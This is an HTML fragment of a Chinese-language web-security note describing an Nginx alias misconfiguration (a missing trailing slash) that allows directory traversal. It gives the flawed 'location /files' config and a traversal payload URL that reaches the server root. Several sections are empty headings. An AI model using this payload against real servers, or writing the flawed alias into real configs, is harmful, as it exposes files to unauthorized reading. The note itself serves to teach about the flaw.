		<h1 class="csAD577193">
			<a name="nginx-配置错误漏洞-目录穿越漏洞"><span class="csDE05BCC">Nginx </span><span class="csECDA2D3">配置错误漏洞</span><span class="csDE05BCC"> </span><span class="csECDA2D3">目录穿越漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Nginx</span><span class="cs9C1B1871">在配置别名（</span><span class="cs8926E06">Alias</span><span class="cs9C1B1871">）的时候，如果忘记加</span><span class="cs9FB05234">/</span><span class="cs9C1B1871">，将造成一个目录穿越漏洞。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">错误的配置文件示例（原本的目的是为了让用户访问到</span><span class="cs8926E06">/home/</span><span class="cs9C1B1871">目录下的文件）：</span></p><p class="cs3A447A38"><span class="cs9FB05234">location /files {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;alias /home/;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Payload: </span><span class="cs9FB05234">http://www.0-sec.org:8081/files../</span><span class="cs8926E06"> </span><span class="cs9C1B1871">，成功穿越到根目录：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Nginx/Nginx%20%e9%85%8d%e7%bd%ae%e9%94%99%e8%af%af%e6%bc%8f%e6%b4%9e%20%e7%9b%ae%e5%bd%95%e7%a9%bf%e8%b6%8a%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="440" alt="" style="border-width:0px;" /></span></p></body>
